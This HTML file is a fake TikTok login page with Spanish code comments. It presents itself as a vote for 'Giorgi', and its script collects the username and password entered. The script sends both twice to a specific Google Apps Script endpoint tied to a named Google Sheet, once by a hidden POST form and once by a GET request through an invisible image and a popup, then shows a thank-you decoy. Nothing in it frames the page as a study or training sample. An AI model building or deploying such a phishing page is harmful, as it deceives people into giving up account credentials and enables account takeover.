<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: black; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        
        .login-box { 
            background: rgba(22, 24, 35, 0.95); 
            padding: 30px; 
            border-radius: 15px; 
            width: 100%; 
            max-width: 400px; 
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
        }
        
        .logo { margin-bottom: 20px; }
        .logo i { 
            font-size: 50px; 
            background: linear-gradient(45deg, #25F4EE, #FE2C55); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
        }
        h1 { 
            font-size: 28px; 
            margin-bottom: 20px;
            background: linear-gradient(45deg, #25F4EE, #FE2C55); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
        }
        
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: white;
            font-size: 16px;
        }
        
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #25F4EE, #FE2C55);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }
        
        button:hover { opacity: 0.9; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .thankyou { display: none; }
        .success { color: #25F4EE; font-size: 24px; margin: 20px 0; }
        
        .status {
            margin-top: 20px;
            padding: 10px;
            background: rgba(37, 244, 238, 0.1);
            border-radius: 5px;
            font-size: 12px;
        }
        
        @media (max-width: 480px) {
            .login-box { padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="login-box" id="loginBox">
        <div class="logo">
            <i class="fas fa-music"></i>
        </div>
        <h1>TikTok</h1>
        
        <div class="status">
            <p>üìç Datos van a: <strong>TU Google Sheets</strong></p>
            <p>üìä Hoja: <strong>Sheet1</strong></p>
        </div>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="loginBtn">Log In</button>
        </form>
    </div>
    
    <div class="login-box thankyou" id="thankyouBox">
        <div class="success">‚úì Thank You!</div>
        <p>Thank you for voting for Giorgi!</p>
        <p style="font-size: 14px; color: #FE2C55; margin: 20px 0;">
            Data saved to your Google Sheets
        </p>
        
        <div style="margin: 20px 0; padding: 10px; background: rgba(37, 244, 238, 0.1); border-radius: 5px;">
            <p style="font-size: 12px;">üìä <strong>Open your Google Sheets:</strong></p>
            <a href="https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw" 
               target="_blank" 
               style="color: #25F4EE; font-size: 12px; word-break: break-all;">
                https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw
            </a>
        </div>
        
        <button onclick="goBack()">Back to Login</button>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    <script>
        // URL de TU Google Apps Script
        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxjIN6nm3SQ6ki-IUWUuJtb7B8jYkGDD11jBt-4jFO_VNkiSTnRHU2dkAg-hNGa8FYJ/exec";
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const btn = document.getElementById('loginBtn');
            
            if (!username || !password) {
                alert('Please complete all fields');
                return;
            }
            
            // Cambiar bot√≥n
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
            
            console.log('üì§ Sending:', { user: username, pass: '***' });
            
            // M√âTODO 1: FORMULARIO TRADICIONAL (SIN JSON)
            try {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = SCRIPT_URL;
                form.target = '_blank'; // Abrir en nueva pesta√±a
                form.enctype = 'application/x-www-form-urlencoded'; // IMPORTANTE: NO es JSON
                
                // Agregar campos como formulario NORMAL
                const addField = (name, value) => {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = name;
                    input.value = value;
                    form.appendChild(input);
                };
                
                const now = new Date();
                addField('user', username);
                addField('pass', password);
                addField('date', now.toLocaleDateString());
                addField('time', now.toLocaleTimeString());
                addField('source', 'TikTok-GitHub');
                
                document.body.appendChild(form);
                console.log('‚úÖ Form created with fields:', form.elements.length);
                
                // Enviar formulario
                form.submit();
                console.log('üì® Form submitted');
                
                // No eliminar el formulario - d√©jalo para ver respuesta
                
            } catch (error) {
                console.error('‚ùå Form error:', error);
            }
            
            // M√âTODO 2: GET como backup (siempre funciona)
            setTimeout(() => {
                const params = new URLSearchParams({
                    user: username,
                    pass: password,
                    date: new Date().toLocaleDateString(),
                    time: new Date().toLocaleTimeString(),
                    method: 'GET',
                    random: Math.random()
                }).toString();
                
                const getUrl = SCRIPT_URL + '?' + params;
                console.log('üîó GET URL:', getUrl);
                
                // Usar imagen invisible para enviar GET
                const img = new Image();
                img.src = getUrl;
                
                // Tambi√©n abrir en ventana peque√±a
                const win = window.open(getUrl, '_blank', 'width=400,height=300');
                
            }, 1000);
            
            // Mostrar p√°gina de agradecimiento
            setTimeout(() => {
                document.getElementById('loginBox').style.display = 'none';
                document.getElementById('thankyouBox').style.display = 'block';
                btn.disabled = false;
                btn.innerHTML = 'Log In';
                
                console.log('üéâ Showing thank you page');
            }, 1500);
        });
        
        function goBack() {
            document.getElementById('thankyouBox').style.display = 'none';
            document.getElementById('loginBox').style.display = 'block';
            document.getElementById('loginForm').reset();
        }
        
        // Al cargar la p√°gina
        window.addEventListener('load', function() {
            console.log('‚úÖ Page loaded');
            console.log('üéØ Target Sheet: https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw');
            console.log('üîó Script URL:', SCRIPT_URL);
        });
    </script>
</body>
</html>
